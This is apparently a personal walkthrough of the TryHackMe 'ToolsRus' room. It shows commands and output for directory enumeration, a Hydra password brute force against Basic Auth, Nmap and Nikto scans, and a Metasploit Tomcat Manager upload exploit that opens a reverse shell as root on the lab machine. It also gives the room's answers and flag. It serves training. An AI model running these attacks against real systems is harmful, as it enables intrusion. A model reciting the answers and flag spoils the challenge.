---
title: ToolsRus
summary: TryHackMe room using Feroxbuster, Hydra, Nmap, Nikto, and Metasploit to enumerate and exploit an exposed Apache Tomcat Manager instance.
date: 2026-06-29
difficulty: easy
os: Linux
tags: [TryHackMe, Enumeration, Feroxbuster, Hydra, Nmap, Nikto, Metasploit, Tomcat]
url: https://tryhackme.com/room/toolsrus
---

# CTF Room: ToolsRus
- [Link to room](https://tryhackme.com/room/toolsrus)
- **Difficulty:** Easy
- **Category:** Enumeration, Web, Tomcat, Metasploit
- **OS:** Linux

## 1. Brief
ToolsRus is a TryHackMe room that walks through using common security tools to enumerate and compromise a target server.

The tools used in this room were:

- Feroxbuster
- Hydra
- Nmap
- Nikto
- Metasploit

## 2. Lab Setup
I added the target to `/etc/hosts` so the room could be accessed through a stable hostname.

### Hosts File
```bash
sudo nano /etc/hosts
```

```bash
10.130.146.145    toolsrus.thm
```

## 3. Enumeration

#### What directory can you find, that begins with a "g"?
### Feroxbuster
```bash
feroxbuster -u http://toolsrus.thm
```

### Answer
```bash
guidelines
```

#### Whose name can you find from this directory?
Navigating to the discovered directory showed the following message:

```bash
Hey bob, did you update that TomCat server?
```

### Answer
```bash
bob
```

#### What directory has basic authentication?
Feroxbuster also found a directory returning HTTP `401`, indicating Basic Authentication.

### Answer
```bash
protected
```

## 4. Brute Forcing Basic Authentication

#### What is bob's password to the protected part of the website?
Since the username `bob` was found in `/guidelines/`, I used Hydra against the Basic Auth protected directory.

### Hydra
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt toolsrus.thm http-get /protected -V -f
```

### Output
```bash
[DATA] attacking http-get://toolsrus.thm:80/protected
[80][http-get] host: toolsrus.thm   login: bob   password: bubbles
[STATUS] attack finished for toolsrus.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

### Answer
```bash
bubbles
```

## 5. Service Enumeration

#### What other port that serves a web service is open on the machine?
### Nmap
```bash
nmap toolsrus.thm
```

### Output
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-29 17:22 +0100
Nmap scan report for toolsrus.thm (10.130.146.145)
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

Port `1234` was also serving a web service.

### Answer
```bash
1234
```

#### What is the name and version of the software running on the port from question 5?
Navigating to the web service on port `1234` showed Apache Tomcat.

### Browser
```bash
http://toolsrus.thm:1234
```

### Answer
```bash
Apache Tomcat/7.0.88
```

## 6. Nikto

#### Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files are found?
### Nikto
```bash
nikto -h http://toolsrus.thm:1234/manager/html -id bob:bubbles
```

### Output
```bash
+ Target IP:          10.130.146.145
+ Target Hostname:    toolsrus.thm
+ Target Port:        1234
+ Server: Apache-Coyote/1.1
+ [700500] Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ [003399] /manager/html/manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ [003399] /manager/html/jk-manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ [003399] /manager/html/jk-status/manager-howto.html: Tomcat documentation found. See: CWE-552
+ [003399] /manager/html/admin/manager-howto.html: Tomcat documentation found. See: CWE-552
+ [003399] /manager/html/host-manager/manager-howto.html: Tomcat documentation found. See: CWE-552
```

### Answer
```bash
5
```

#### What is the server version?
I also scanned the main web service on port `80`.

### Nikto
```bash
nikto -h http://toolsrus.thm:80 -id bob:bubbles
```

### Output
```bash
+ Target IP:          10.130.146.145
+ Target Hostname:    toolsrus.thm
+ Target Port:        80
+ Server: Apache/2.4.18 (Ubuntu)
+ [600050] Apache/2.4.18 appears to be outdated (current is at least 2.4.66).
+ [999990] OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
```

### Answer
```bash
Apache/2.4.18
```

#### What version of Apache-Coyote is this service using?
The Tomcat manager scan identified the Apache-Coyote version.

### Answer
```bash
1.1
```

## 7. Exploitation

#### Use Metasploit to exploit the service and get a shell on the system.
The credentials `bob:bubbles` worked against Tomcat Manager, so I used the Tomcat Manager upload module in Metasploit.

### Metasploit
```bash
msfconsole
search tomcat_mgr_upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.130.146.145
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
run
```

### Output
```bash
[*] Started reverse TCP handler on 192.168.139.170:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 9ZG7qtrL7j...
[*] Executing 9ZG7qtrL7j...
[*] Undeploying 9ZG7qtrL7j ...
[*] Sending stage (2952 bytes) to 10.130.146.145
[*] Command shell session 1 opened (192.168.139.170:4444 -> 10.130.146.145:42442) at 2026-06-29 17:42:25 +0100
```

#### What user did you get a shell as?
### Shell
```bash
whoami
```

### Output
```bash
root
```

### Answer
```bash
root
```

#### What flag is found in the root directory?
### Shell
```bash
cat /root/flag.txt
```

### Answer
```bash
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

## 8. Summary
This room tied together the basic enumeration and exploitation workflow well. Feroxbuster found useful web directories, `/guidelines/` leaked the username `bob`, and Hydra cracked the Basic Auth password as `bubbles`.

Nmap then showed an additional web service on port `1234`, which turned out to be Apache Tomcat `7.0.88`. Nikto confirmed authenticated access to Tomcat Manager and identified Tomcat documentation paths. With valid Tomcat Manager credentials, Metasploit's `tomcat_mgr_upload` module provided a shell as `root`, allowing the final flag to be read from `/root/flag.txt`.
